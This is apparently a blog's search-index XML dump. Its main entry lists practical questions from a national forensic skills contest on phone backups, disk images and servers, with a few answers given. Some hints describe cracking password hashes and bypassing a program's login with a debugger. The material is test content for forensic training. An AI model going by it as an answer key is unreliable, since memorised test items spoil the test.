f92bc6941cfe1a8fe6673d5324577aa499bad5a194177ba293ec7a6fd0b3346bcac4818a060f725b5e4add2ab0c5dbbf8cd922da64deff53fde3d6bcdfa8e82f41ee7f011ab8999aa1d8c5679d59d1d9d64d65809e5b35aa5bfe76db824240f55f19933b7681a664f27f61c37057141ef82fc2c2b1f125705e2bca9ca822ad3ade0332eda9aff1a7b45a0887418f22be98d15be2f7e68c532b35119541f92f9e99590cd6ebbbd045347cadf93d8cc5c31b6f5d331c4e6edb4f4de297327be03967295a8d62175818ef09b6468ed1a74e560f8d358307e91c3a473cc791b7491aacc33a9408859a929e4221adc1bc001c1b8e167e8af8fa1628efda84f5f8cb2f9c5d12508a00cdd5f2eae7a3821d72b8928d6fc1a2b7ea841ae42daa6473ca47b50c77a4f82a6d847df2ace25e3fadb1cd7d590a01d0a5ab0a66e6c1b74fe2e74a67cac75873d5c8df27194ee931984c91c812278b9fef7ee3aac8187d7552132dd7049e28c43999ea7476a66a29f9dabfc11a6a9c409b19506c85561b12334a56f3df49c0761f2f8cab12cbecab36d95283138b7957204bd44f01a7181a6bd86c896aa91344cfb5f3ee177023b4a7b4e19685df8a59905e87a40b4103bd891f4616d6644f3ac25251adddfd1baf55e8c5bd0979cea3a51f8721e18da900cd6f8acf5a9f06e3a0f1c954e437699b46a134f9235af520d799f9a04ce9996e9d6c39e7561197b74f357c4f71d20af6202f4efb72dcbb7f36cb2de93026f59b8da4257c68d0c39179a2685269f587a855e4cf944b5d6e46390ba851023bb2210c647d4d1fc0feaeac6c6c4cf0c8a4d2d7c87aaa8bce6e9e5ec42fd9531299dea75373a50cc3e91441b85bd040ff38b02bc9e31ad616eb0714687c1859eb2bed9806634587f04f70e14dda1700847d88938d8fbb34b6b99edd65116cd9dc341a8af3ce153e3df8f8ffd1332715da70eaca86e49e9eae83db25b131f551503e158a57ad9af7bd3819164aa93c451a1c8d12de8e3ae71f5ffff1879e9811a43f417c42006c6a4bd6605c67ef40695ba7cbf05816e58abc3479ac1a513ab938350bacf348fc6fe97454647015b81b0599f03148e3be15931d07006fc8d0acbbdfbe9d85eb7c9c43817d9513434095ffc2a51a0188905321e1ef31a1e3683df314c1e883329736d9daa2b3f34acadf989b7b8512ba70c397719427f259d7a866e9423825d4b88784063755bd7be08f9e0d113640a77c6528695c0fbf332157a42589b3ee63a948f6f93d6ade376d6497a2ef62ebc91e7ba6aacb0c9630be752699cd365c5a5d4c29eb2f625fc79116ce528f06b5e8b0cc3997b8a00adeb56d49584b928b3fe4c5fde77ec3ba4b350791a44848b7b9151895410e3d3a7446dd232edc925518e6cc29e13d9f21a56db6dea80a938baef1e7f2ab3437080b8efa17fd2a92a0bd17bb358f2bff017c8576eec5c6b1da88287d6815e17f4a040390bd3cb0983c1a1a0320cb6050c3aadb20aa143ed8e31bd2c7e6dc44623afb514f9d317de2e3591ccd7f500fa1e22fd3ebed9695ba0b413108770ceeb5834e9c6c32ab3fbaa01b879d72dba06b306f0456b7afc8db0010f0622d60e11840434d9d6011857cdc45555c9e98877ff0be1e040789bf39a4869a394811d38d776feec4aceebd151300088c69cbda8ca8f6db017655949bcb78808b68b8eed8668a77d07477100f93680ae9dd7e071d081bb63d4f471cf1a8292e77ade03d2c6b4d90d1b8c813d7702f60d80369c0b103562f6a250554e49480820b3facd14d7ad2a8d368004b33fcd402c337f039de999ad1281a657efa6bea5e75260fe6ff6fd0f5453affd89d81ab8435b576b9de37f4461addbee3bdf047e65d7754706ee6a9859bc95fc49e5cb54b92e810ccae90ebcd6275695477af51bfe43eae37f9ae665421c4aa0a73608b738129fcbcc9457b384cbefe7db6dfb0354fd849fe556c4f9e0209e21d74a4cec6d8f1e314e2950d86f588640969008b54a355a41cd2e212a0a3308d4b5523559a3d8fca022d38078e93e2c026fc32a2279791e8f332de434d5a62bf97254f733ef27460775b9937cd5d801b1adfda14e7f6de5a84c02dfcf791ca35d4d5501fd0aec7b809c693660c23f70e7042a153728a504061bcd8909c03f4ad6771b7c79f782ef0b8d1261b5430931835c9b344a2f02aebed8daf0abffb79b7805619a7f71793c35969c49e51f0f506645b80826c020bf4261b135b5b921ac346a19014346ec6d0daeb12a5d5cd26a0ebbba0f000f2dfef35e8f79b71aef5d301134afcecace2c914cfcb128fe72248028721ff394ddc4b30be19345a937eba339d7125ddbb3e5de1d95efc208a0574af7340ddd5e5ece5098d514acb3479589e10af1761416c5cee72bd95da849003479cbe25ced4354d9a63dab864cf9ec1fe41e04309e56eae45e76e03c609cf9e0388628f32c62b359833f279345205ab853e7a6503070308050a753c79abdba65410e787355f1763701dfb0a172564315d02118bd9e19f268399f488a987c7513987c226a6b06bc50a03e3a51daecb0bc0a85a069bc8f046687bf86e769f43e547495ff8870e3cdef65eb0b5a267b7f9cacf3ee29b0cd90c95a537c5c08f6f4544a625bdf87c12d0bc4146a3d37af42c3832b8d9a54fe42e36399949c5ad27ea0702bf232afadad620ce2145b85d72db70ac137b6e8c2f51904a7aa233808bc958fc220409a41948323f7f4ca719f4d5c886558e528061f4c97df27018a15f951f143cb984abb083f0a27ff321b3387dc47ad9c33f42014e676dd77aaa5dfc585b1cc5aba54615dce5243941f0e8b86cadfa8a24710521a144c543b8aeb78e7f4cb045ca16660626f80f1484eb340a7d9f3fca18fd2fd5957543055a37ec75d288f8a175a8de3a9ee31053b3d1e28f17a1d795962feb979cad8f58a2fc1dd567684715940c1bdb722ef949c9021c30f2a900d8cb7408f06c3db61044550f2a8471911e7583717065f835211c9afa811ee1545d5f454ecac84eebc017c67750101ec43e00153198882abb14ee914a2e17f596b040d97a8fea64e31abd2bd637</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025-10-25?ctf玩耍</title>
      <link href="/2025/10/25/2025-10-25-ctf%E7%8E%A9%E8%80%8D/"/>
      <url>/2025/10/25/2025-10-25-ctf%E7%8E%A9%E8%80%8D/</url>
      
        <content type="html"><![CDATA[<p><a href="http://challenge.ilovectf.cn:30770">challenge.ilovectf.cn:30770</a><br><img src="/img/2025-10-25-ctf%E7%8E%A9%E8%80%8D_image.png" alt="alt text"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2025刑事技能大赛</title>
      <link href="/2025/10/25/2025%E5%88%91%E4%BA%8B%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"/>
      <url>/2025/10/25/2025%E5%88%91%E4%BA%8B%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1>第五届全国刑事技术技能大赛实操 · 电子物证-手机部分</h1><h3 id="1-根据华为手机备份分析，手机型号是什么"><a class="header-anchor" href="#1-根据华为手机备份分析，手机型号是什么">¶</a>1. 根据华为手机备份分析，手机型号是什么?</h3><p>(1 分) [答案格式: HUAWEI Mate 30][手机取证]</p><ul><li>backupinfo.ini用记事本打开</li><li>protuct_model=HUAWEI P20 Pro</li></ul><h3 id="2-根据小米手机备份分析，手机-IMEI-是多少"><a class="header-anchor" href="#2-根据小米手机备份分析，手机-IMEI-是多少">¶</a>2. 根据小米手机备份分析，手机 IMEI 是多少?</h3><p>(1 分) [答案格式: 123456789012345/123456789012345][手机取证]</p><h3 id="3-根据华为手机备份分析，使用的“备份-localBackup-”APP-的版本号是多少"><a class="header-anchor" href="#3-根据华为手机备份分析，使用的“备份-localBackup-”APP-的版本号是多少">¶</a>3. 根据华为手机备份分析，使用的“备份(localBackup)”APP 的版本号是多少?</h3><p>(1 分) [答案格式: 13.0.2.110][手机取证]</p><ul><li>hisuiteversion=15.0.1.210</li></ul><h3 id="4-根据华为手机备份分析-备份密码为-a1B2C3D4-，通讯录中“耗子”的手机号码是多少"><a class="header-anchor" href="#4-根据华为手机备份分析-备份密码为-a1B2C3D4-，通讯录中“耗子”的手机号码是多少">¶</a>4. 根据华为手机备份分析(备份密码为:a1B2C3D4#)，通讯录中“耗子”的手机号码是多少?</h3><p>(1 分) [答案格式: 13112345678][手机取证]</p><h3 id="5-根据华为手机备份分析，机主设置了在哪一天“给‘耗子’送‘鱼’”这个提醒"><a class="header-anchor" href="#5-根据华为手机备份分析，机主设置了在哪一天“给‘耗子’送‘鱼’”这个提醒">¶</a>5. 根据华为手机备份分析，机主设置了在哪一天“给‘耗子’送‘鱼’”这个提醒?</h3><p>(1 分) [答案格式: 2023-01-01][手机取证]</p><h3 id="6-根据小米手机备份分析，机主的家庭地址所在省份是什么"><a class="header-anchor" href="#6-根据小米手机备份分析，机主的家庭地址所在省份是什么">¶</a>6. 根据小米手机备份分析，机主的家庭地址所在省份是什么?</h3><p>(1 分) [答案格式: 海南省][手机取证]</p><h3 id="7-根据小米手机备份分析，请给出-WIFI-SSID-为“work-5G”的密码是多少"><a class="header-anchor" href="#7-根据小米手机备份分析，请给出-WIFI-SSID-为“work-5G”的密码是多少">¶</a>7. 根据小米手机备份分析，请给出 WIFI SSID 为“work_5G”的密码是多少?</h3><p>(1 分) [答案格式: 123456789][手机取证]</p><h3 id="8-根据小米手机备份分析，在其相册中有一张照片使用-photoshop-篡改过，请给出这张照片的名称是什么"><a class="header-anchor" href="#8-根据小米手机备份分析，在其相册中有一张照片使用-photoshop-篡改过，请给出这张照片的名称是什么">¶</a>8. 根据小米手机备份分析，在其相册中有一张照片使用 photoshop 篡改过，请给出这张照片的名称是什么?</h3><p>(1 分) [答案格式: IMG_20200101_010101.jpg][手机取证]</p><h3 id="9-同上，请分析出此照片使用-photoshop-的修改时间是"><a class="header-anchor" href="#9-同上，请分析出此照片使用-photoshop-的修改时间是">¶</a>9. 同上，请分析出此照片使用 photoshop 的修改时间是?</h3><p>(1 分) [答案格式: 2025:01:01 01:01:01][手机取证]</p><h3 id="10-根据小米手机备份分析，手机中登录过几个-QQ-号"><a class="header-anchor" href="#10-根据小米手机备份分析，手机中登录过几个-QQ-号">¶</a>10. 根据小米手机备份分析，手机中登录过几个 QQ 号?</h3><p>(1 分) [答案格式: 5][手机取证]</p><h3 id="11-根据小米手机备份分析，微信好友“wxid-8gmzat7zjnmf22-SunShine-”发给嫌疑人的“membership-commission-sql”脚本文件的-SM3-后六位是多少"><a class="header-anchor" href="#11-根据小米手机备份分析，微信好友“wxid-8gmzat7zjnmf22-SunShine-”发给嫌疑人的“membership-commission-sql”脚本文件的-SM3-后六位是多少">¶</a>11. 根据小米手机备份分析，微信好友“wxid_8gmzat7zjnmf22(SunShine)”发给嫌疑人的“membership_commission.sql”脚本文件的 SM3 后六位是多少?</h3><p>(1 分) [答案格式: abcdef][手机取证]</p><h3 id="12-同上，通过“membership-commission-sql”脚本文件，请给出会员级别为“gold”的会员人数是多少？"><a class="header-anchor" href="#12-同上，通过“membership-commission-sql”脚本文件，请给出会员级别为“gold”的会员人数是多少？">¶</a>12. 同上，通过“membership_commission.sql”脚本文件，请给出会员级别为“gold”的会员人数是多少？</h3><p>(1 分)（字母小写）[答案格式: 1][手机取证]</p><h3 id="13-同上，通过“membership-commission-sql”脚本文件，请给出会员级别为“silver”且消费金额高于同级别会员-silver-平均消费金额的会员数量是多少？"><a class="header-anchor" href="#13-同上，通过“membership-commission-sql”脚本文件，请给出会员级别为“silver”且消费金额高于同级别会员-silver-平均消费金额的会员数量是多少？">¶</a>13. 同上，通过“membership_commission.sql”脚本文件，请给出会员级别为“silver”且消费金额高于同级别会员(silver)平均消费金额的会员数量是多少？</h3><p>(1 分) [答案格式: 3][手机取证]</p><h3 id="14-根据小米手机备份分析，微信中“客户信息-xls”有密码保护，已知密码为-4-位数字，请给出这个文件的密码是多少"><a class="header-anchor" href="#14-根据小米手机备份分析，微信中“客户信息-xls”有密码保护，已知密码为-4-位数字，请给出这个文件的密码是多少">¶</a>14. 根据小米手机备份分析，微信中“客户信息.xls”有密码保护，已知密码为 4 位数字，请给出这个文件的密码是多少?</h3><p>(1 分) [答案格式: 0000][手机取证]</p><h3 id="15-根据小米手机备份分析，请统计“客户信息-xls”中“电话”列不为空且“城市”为“北京”的数据总共有多少条"><a class="header-anchor" href="#15-根据小米手机备份分析，请统计“客户信息-xls”中“电话”列不为空且“城市”为“北京”的数据总共有多少条">¶</a>15. 根据小米手机备份分析，请统计“客户信息.xls”中“电话”列不为空且“城市”为“北京”的数据总共有多少条?</h3><p>(1 分) [答案格式: 123456][手机取证]</p><h3 id="16-根据小米手机备份分析，app“umanager”使用-Sqlite-数据库存储数据，其中记录用户信息的表“users”数据已被删除，请分析用户名为“uUser-eelum”的电话号码是多少？"><a class="header-anchor" href="#16-根据小米手机备份分析，app“umanager”使用-Sqlite-数据库存储数据，其中记录用户信息的表“users”数据已被删除，请分析用户名为“uUser-eelum”的电话号码是多少？">¶</a>16. 根据小米手机备份分析，app“umanager”使用 Sqlite 数据库存储数据，其中记录用户信息的表“users”数据已被删除，请分析用户名为“uUser_eelum”的电话号码是多少？</h3><p>(1 分) [答案格式: 13112345678][手机取证]</p><h3 id="17-同上，在“umanager”app-中有一个配置文件-config-json-enc，但此文件使用-AES-对称加密，请分析此加密密钥是什么"><a class="header-anchor" href="#17-同上，在“umanager”app-中有一个配置文件-config-json-enc，但此文件使用-AES-对称加密，请分析此加密密钥是什么">¶</a>17. 同上，在“umanager”app 中有一个配置文件 config.json.enc，但此文件使用 AES 对称加密，请分析此加密密钥是什么?</h3><p>(1 分) [答案格式: 123456789abcdef][手机取证]</p><h3 id="18-同上，在配置文件-config-json-enc-中记录了管理员-admin-的密码，请给出其密码是什么"><a class="header-anchor" href="#18-同上，在配置文件-config-json-enc-中记录了管理员-admin-的密码，请给出其密码是什么">¶</a>18. 同上，在配置文件 config.json.enc 中记录了管理员 admin 的密码，请给出其密码是什么?</h3><p>(1 分) [答案格式: 123456][手机取证]</p><h3 id="19-根据小米手机备份分析，“umanager”app-中有一个-transactions-json-文件记录了每个用户收入与支出，请统计用户-ID-为-1512-的总收入是多少"><a class="header-anchor" href="#19-根据小米手机备份分析，“umanager”app-中有一个-transactions-json-文件记录了每个用户收入与支出，请统计用户-ID-为-1512-的总收入是多少">¶</a>19. 根据小米手机备份分析，“umanager”app 中有一个 transactions.json 文件记录了每个用户收入与支出，请统计用户 ID 为 1512 的总收入是多少?</h3><p>(1 分) [答案格式: 10000][手机取证]</p><h3 id="20-根据小米手机备份分析，在-app“v2rayNG”中类型为“VLESS”的代理有多少个"><a class="header-anchor" href="#20-根据小米手机备份分析，在-app“v2rayNG”中类型为“VLESS”的代理有多少个">¶</a>20. 根据小米手机备份分析，在 app“v2rayNG”中类型为“VLESS”的代理有多少个?</h3><p>(1 分) [答案格式: 101][手机取证]</p><h1>第五届全国刑事技术技能大赛实操 · 电子物证-计算机部分</h1><p>说明：下列各题的素材目录位于相应题号下，如题 1、题 2、题 3 的素材位于 C1-3 目录下，题 4 的素材位于 C4 目录下。</p><p>在电子数据检验中，因某个 U 盘检材存在不稳定的扇区，每次镜像都会因这些不稳定扇区导致生成的目标文件无法稳定。为了尽最大可能可靠地固定这个 U 盘的原始数据，我们采用了间断性计算哈希的方法。具体方法为：对 U 盘每 1M 的数据计算 SHA256 哈希，将这些哈希值以二进制的方式顺序保存为一个哈希列表文件，再计算这个哈希列表文件的哈希，同时记录不稳定扇区所在的 1M 块号。实际检验中，我们对这个 U 盘做了 2 次副本，分别为 disk#1.dd 和 disk#2.dd，对 disk#1.dd 按上述算法计算的哈希列表文件为 sha256list#1.bin，disk#2.dd 未生成哈希列表。现提供 C1-3 目录下的 disk#2.dd 和 sha256list#1.bin 文件，请分析后回答问题 1~3。</p><h3 id="1-U-盘的第几-M-存在不稳定扇区（编号从-0-开始）"><a class="header-anchor" href="#1-U-盘的第几-M-存在不稳定扇区（编号从-0-开始）">¶</a>1. U 盘的第几 M 存在不稳定扇区（编号从 0 开始）?</h3><p>(1 分) [答案格式: 123][计算机取证]</p><h3 id="2-这个不稳定扇区影响了哪个文件-（请给出文件名）"><a class="header-anchor" href="#2-这个不稳定扇区影响了哪个文件-（请给出文件名）">¶</a>2. 这个不稳定扇区影响了哪个文件?（请给出文件名）</h3><p>(1 分) [答案格式: abc123][计算机取证]</p><h3 id="3-按相同思路对-disk-2-dd-计算-MD5-列表哈希，最终-MD5-哈希值的后-6-位是多少（字母大写）"><a class="header-anchor" href="#3-按相同思路对-disk-2-dd-计算-MD5-列表哈希，最终-MD5-哈希值的后-6-位是多少（字母大写）">¶</a>3. 按相同思路对 disk#2.dd 计算 MD5 列表哈希，最终 MD5 哈希值的后 6 位是多少（字母大写）?</h3><p>(1 分) [答案格式: A1B2C3][计算机取证]</p><p>C4\data.csv 文件是一份来自某个涉案团伙的绩效提成表。表中包含三列数据：订单号、销售 ID、提成额。提成额的算法为：如果是周一至周五的订单，销售额的 5% 为提成；如果订单是周六日的，提成额为销售额的 10%。请据此规则，通过分析计算后回答问题 4。提示：订单号中包含一个日期值，为订单产生时的时间记录，提成算法中涉及到的日期与此日期值相同。</p><h3 id="4-ID-为-S006-的销售人员-2024-年第-3-季度的销售额是多少"><a class="header-anchor" href="#4-ID-为-S006-的销售人员-2024-年第-3-季度的销售额是多少">¶</a>4. ID 为 S006 的销售人员 2024 年第 3 季度的销售额是多少?</h3><p>(1 分) [答案格式: 123][计算机取证]</p><p>加壳是保护程序不被反编译的一种重要手段。已知 C5\esend.exe 是一个被简单加过壳的应用程序，其工作原理是在特定条件下搜集用户的敏感信息，并自动发送至某个电子邮箱。邮箱后缀是 trek2025.ngo。提示：脱壳后查找字符串。</p><h3 id="5-这个电子邮箱的用户名是什么"><a class="header-anchor" href="#5-这个电子邮箱的用户名是什么">¶</a>5. 这个电子邮箱的用户名是什么?</h3><p>(1 分) [答案格式: 123abc][计算机取证]</p><p>C6-8\disk.vmdk.7z 中有一个用于业绩统计的软件（路径：虚拟磁盘主分区根目录下的 perf_stat_v6\perf_stat.exe）。因部分文件破坏，系统无法启动。复制软件出来直接运行提示“程序运行环境异常…”。程序运行时，需要先读取某个名称为 .pem 的密钥文件，再访问注册表 HKEY_CLASSES_ROOT（HKCR）中的某个键值。说明：HKCR 是 HKCU\Software\Classes 与 HKLM\SOFTWARE\Classes 的合并视图，前者优先。请通过技术手段尝试构建此应用程序所需环境，回答问题 6~8。</p><h3 id="6-程序运行时需要依赖的一个-pem-的文件名称叫什么"><a class="header-anchor" href="#6-程序运行时需要依赖的一个-pem-的文件名称叫什么">¶</a>6. 程序运行时需要依赖的一个 .pem 的文件名称叫什么?</h3><p>(1 分) [答案格式: ABC123.pem][计算机取证]</p><h3 id="7-程序运行时需要访问的注册表键值中，用到了-HKCR-下某个文件扩展名的子键值（如：HKCR-bat-CombinedValidation-的-REG-SZ-值）。该哈希字符串值的最后-6-个字符是什么（字母大写）"><a class="header-anchor" href="#7-程序运行时需要访问的注册表键值中，用到了-HKCR-下某个文件扩展名的子键值（如：HKCR-bat-CombinedValidation-的-REG-SZ-值）。该哈希字符串值的最后-6-个字符是什么（字母大写）">¶</a>7. 程序运行时需要访问的注册表键值中，用到了 HKCR 下某个文件扩展名的子键值（如：HKCR.bat\CombinedValidation 的 REG_SZ 值）。该哈希字符串值的最后 6 个字符是什么（字母大写）?</h3><p>(1 分) [答案格式: AB123C][计算机取证]</p><h3 id="8-使用用户名-admin，密码-trek2025-登录系统，程序仿真运行后，ID-为-1014-的用户其提成总计是多少"><a class="header-anchor" href="#8-使用用户名-admin，密码-trek2025-登录系统，程序仿真运行后，ID-为-1014-的用户其提成总计是多少">¶</a>8. 使用用户名 admin，密码 trek2025 登录系统，程序仿真运行后，ID 为 1014 的用户其提成总计是多少?</h3><p>(1 分) [答案格式: 123][计算机取证]</p><p>C9、C10、C11、C12、C13 目录中，是一个业绩查询系统的不同版本，分别管理不同的数据，管理员用户名均为 admin。请参考各自的背景说明，回答对应问题。</p><p>C9 目录下的 perf_stat.exe（V1），数据库 data_v1.db 中密码字段为用户密码的 MD5 单向哈希。破解 admin 用户的密码明文并登录后，回答问题 9。提示：关注密码提示问题；系统对数据库密码字段的修改有校验。</p><h3 id="9-ID-为-1066-的用户，其提成总计是多少"><a class="header-anchor" href="#9-ID-为-1066-的用户，其提成总计是多少">¶</a>9. ID 为 1066 的用户，其提成总计是多少?</h3><p>(1 分) [答案格式: 123][计算机取证]</p><p>C10 目录下的 perf_stat.exe（V2），数据库 data_v2.db 中记录的用户密码算法未知，但已知 id 为 1001 的登录密码“trek2025”。该算法同样适用于 admin 管理员。请尝试登录并回答问题 10。</p><h3 id="10-ID-为-1042-的用户，其提成总计是多少"><a class="header-anchor" href="#10-ID-为-1042-的用户，其提成总计是多少">¶</a>10. ID 为 1042 的用户，其提成总计是多少?</h3><p>(1 分) [答案格式: 123][计算机取证]</p><p>C11 目录下的 perf_stat.exe（V3），数据库 data_v3.db 中记录的用户密码算法未知。同级目录下提供用于命令方式修改密码的 .NET 程序 ChsaPassword（反编译后生成 “C11\V3.ChsaPassword\Program.cs”）。利用该信息解除口令限制后登录，回答问题 11。</p><h3 id="11-ID-为-1082-的用户，其提成总计是多少"><a class="header-anchor" href="#11-ID-为-1082-的用户，其提成总计是多少">¶</a>11. ID 为 1082 的用户，其提成总计是多少?</h3><p>(1 分) [答案格式: 123][计算机取证]</p><p>C12 目录下的 perf_stat_v4.exe（V4），数据库 data_v4.db 中记录的用户密码算法未知。该版本为 Qt 编写，程序未加壳未混淆，可通过动态跟踪绕过密码。提示：附件中的 x64dbg 可用；密码错误提示是下断点的好信息。</p><h3 id="12-ID-为-1066-的用户，其提成总计是多少"><a class="header-anchor" href="#12-ID-为-1066-的用户，其提成总计是多少">¶</a>12. ID 为 1066 的用户，其提成总计是多少?</h3><p>(1 分) [答案格式: 123][计算机取证]</p><p>C13 目录下的 perf_stat.exe（V5），数据库 data_v5.db 中记录的用户密码算法未知，但该版本有密码找回功能（通过邮箱重置）。结合数据库和其他必要手段解除登录限制后，回答问题 13。<br>提示：找回密码通过明文 SMTP（端口 25，无 TLS/SSL 与鉴权）；C13\fake_smtp_server 提供 Python 版本和图形版本（管理员权限运行）；admin 的真实姓名为：王一山；建议方法仅供参考。</p><h3 id="13-ID-为-1062-的用户，其提成总计是多少"><a class="header-anchor" href="#13-ID-为-1062-的用户，其提成总计是多少">¶</a>13. ID 为 1062 的用户，其提成总计是多少?</h3><p>(1 分) [答案格式: 123][计算机取证]</p><h3 id="14-C14-data-pdf-文件无法打开，怀疑进行了简单的加密。请分析文件结构，尝试解密文件，并回答文件第一页中记录的密码是什么"><a class="header-anchor" href="#14-C14-data-pdf-文件无法打开，怀疑进行了简单的加密。请分析文件结构，尝试解密文件，并回答文件第一页中记录的密码是什么">¶</a>14. C14\data.pdf 文件无法打开，怀疑进行了简单的加密。请分析文件结构，尝试解密文件，并回答文件第一页中记录的密码是什么?</h3><p>(1 分) [答案格式: Aa12b3][计算机取证]</p><p>经调查，某 U 盘曾以 docx 存储过一个重要的 BitLocker 恢复密钥。日常使用中除了这个重要文件外，仅保存网站日志的 zip 压缩文件。U 盘已被格式化，原有文件无法直接读取。请对已格式化 U 盘进行深度检索和比对，尝试恢复关键 BitLocker 恢复密钥文件。提示：“C15-17\disk_cert(old).docx”与目标文件格式相同。</p><h3 id="15-问题-1：这个文件的头部位于磁盘的哪个扇区-（扇区大小：512-字节，扇区编号从-0-开始）"><a class="header-anchor" href="#15-问题-1：这个文件的头部位于磁盘的哪个扇区-（扇区大小：512-字节，扇区编号从-0-开始）">¶</a>15. 问题 1：这个文件的头部位于磁盘的哪个扇区?（扇区大小：512 字节，扇区编号从 0 开始）</h3><p>(1 分) [答案格式: 123][计算机取证]</p><h3 id="16-问题-2：这个文件的尾部位于磁盘的哪个扇区-（扇区大小：512-字节，扇区编号从-0-开始）"><a class="header-anchor" href="#16-问题-2：这个文件的尾部位于磁盘的哪个扇区-（扇区大小：512-字节，扇区编号从-0-开始）">¶</a>16. 问题 2：这个文件的尾部位于磁盘的哪个扇区?（扇区大小：512 字节，扇区编号从 0 开始）</h3><p>(1 分) [答案格式: 123][计算机取证]</p><h3 id="17-问题-3：文件中记录的-bitlocker-恢复密钥的后-6-位是什么"><a class="header-anchor" href="#17-问题-3：文件中记录的-bitlocker-恢复密钥的后-6-位是什么">¶</a>17. 问题 3：文件中记录的 bitlocker 恢复密钥的后 6 位是什么?</h3><p>(1 分) [答案格式: Aa12b3][计算机取证]</p><h3 id="18-不稳定-U-盘中存储了-key-zip-和其备份-key-bak-zip，导出后两者都打不开。请修复该压缩文件，回答修复后-zip-文件的-SHA256-哈希后-6-位（大写字母）"><a class="header-anchor" href="#18-不稳定-U-盘中存储了-key-zip-和其备份-key-bak-zip，导出后两者都打不开。请修复该压缩文件，回答修复后-zip-文件的-SHA256-哈希后-6-位（大写字母）">¶</a>18. 不稳定 U 盘中存储了 key.zip 和其备份 key.bak.zip，导出后两者都打不开。请修复该压缩文件，回答修复后 zip 文件的 SHA256 哈希后 6 位（大写字母）:</h3><p>(1 分) [答案格式: ABC123][计算机取证]</p><p>C19\case155.tar.gz 解开后是一个 U 盘镜像，保存着来源于 Linux 服务器的账单文件。history 显示：对/dev/sdb 执行 mkfs.fat，挂载至/mnt；用 “rsync -ar” 将/website/access_log 同步到/mnt；最后卸载。拷贝期间无证据显示其他进程访问/dev/sdb。完成后嫌疑人对其中 1 个文件进行了修改，并刷新了所有文件的时间信息（无法通过时间戳判断）。提示：20250403.log 并未被篡改。</p><h3 id="19-请综合分析-U-盘存储特征，判定被篡改的具体文件，并回答其文件名称。"><a class="header-anchor" href="#19-请综合分析-U-盘存储特征，判定被篡改的具体文件，并回答其文件名称。">¶</a>19. 请综合分析 U 盘存储特征，判定被篡改的具体文件，并回答其文件名称。</h3><p>(1 分) [答案格式: file.abc][计算机取证]</p><p>C20\data.vhd 中保存了一批从网站服务器中归档回来的加密密钥，这些文件似乎下载回来都没有用过。已知这些密钥中只有一个用于管理者使用，其他都是普通用户使用的。请通过文件系统底层特征分析判断，在该虚拟磁盘中目录 bak194 下哪个密钥是管理者使用的，回答其文件名称。</p><h3 id="20-bak194-目录下哪个密钥是管理者使用-（回答文件名称）"><a class="header-anchor" href="#20-bak194-目录下哪个密钥是管理者使用-（回答文件名称）">¶</a>20. bak194 目录下哪个密钥是管理者使用?（回答文件名称）</h3><p>(1 分) [答案格式: file.abc][计算机取证]</p><h1>第五届全国刑事技术技能大赛实操 · 电子物证-服务器部分</h1><p>说明：</p><ul><li>可使用 “RUN-ENV-VM\trek_sys_v2_exam” 虚拟机（简称 trek_sys_v2_exam）或其他方式（如 wsl）。</li><li>建议使用 ssh 连接（虚拟机内已开启 DHCP）。</li><li>建议使用 sftp、samba 等将实验所需文件传入虚拟机（部分素材已在虚拟机中）。</li><li>登录用户：trek / trek，具备 sudo 权限，root 未设置。</li><li>如虚拟机无法启动，可通过 RUN-ENV-VM 下的 ovf 包导入，路径：“RUN-ENV-VM\trek_sys_v2_exam_ovf\trek_sys_v2_exam.ovf”。正常启动时忽略该目录。</li></ul><h3 id="1-以-HMAC-密钥-trek132-计算-s1-2-lzop-1-04-tar-gz-的-HMAC-SM3-哈希值，填写哈希后-6-位（字母大写）"><a class="header-anchor" href="#1-以-HMAC-密钥-trek132-计算-s1-2-lzop-1-04-tar-gz-的-HMAC-SM3-哈希值，填写哈希后-6-位（字母大写）">¶</a>1. 以 HMAC 密钥 trek132 计算 s1_2/lzop-1.04.tar.gz 的 HMAC-SM3 哈希值，填写哈希后 6 位（字母大写）</h3><p>(1 分) [答案格式: ABC123][服务器取证]<br>提示：素材位置 “s1_2” 目录。</p><h3 id="2-编译-lzop-源码后对-“s1-2-55932-pem-lzo”-解压，回答解压出的唯一文件的-SHA256-哈希后-6-位（字母大写）"><a class="header-anchor" href="#2-编译-lzop-源码后对-“s1-2-55932-pem-lzo”-解压，回答解压出的唯一文件的-SHA256-哈希后-6-位（字母大写）">¶</a>2. 编译 lzop 源码后对 “s1_2/55932.pem.lzo” 解压，回答解压出的唯一文件的 SHA256 哈希后 6 位（字母大写）</h3><p>(1 分) [答案格式: ABC123][服务器取证]<br>提示：素材位置 “s1_2”；虚拟机已配置本地 apt 源；缺失头文件需安装 dev 包。</p><h3 id="3-还原-s3-4-webbak-网站，以-http-admin-trek2025-ngo-为域名进行访问，回答登陆界面显示的-build-id"><a class="header-anchor" href="#3-还原-s3-4-webbak-网站，以-http-admin-trek2025-ngo-为域名进行访问，回答登陆界面显示的-build-id">¶</a>3. 还原 s3_4/webbak 网站，以 <a href="http://admin.trek2025.ngo/">http://admin.trek2025.ngo/</a> 为域名进行访问，回答登陆界面显示的 build id</h3><p>(1 分) [答案格式: 1234][服务器取证]</p><h3 id="4-见上题，还原网站后使用-admin-尝试登陆后台，密码输错后页面中显示的密码提示的-5-位数字是什么"><a class="header-anchor" href="#4-见上题，还原网站后使用-admin-尝试登陆后台，密码输错后页面中显示的密码提示的-5-位数字是什么">¶</a>4. 见上题，还原网站后使用 admin 尝试登陆后台，密码输错后页面中显示的密码提示的 5 位数字是什么</h3><p>(1 分) [答案格式: 12345][服务器取证]<br>提示：素材位置 “s3_4”；架构为 nginx 代理前端 + go 后端；还原参考 README.txt。</p><h3 id="5-exam-allinone-flat-tar-xz-是-Docker-容器导出副本。找到网站“comet”对应的-SIGN-pem-并计算其-SHA1-哈希后-6-位（字母大写）"><a class="header-anchor" 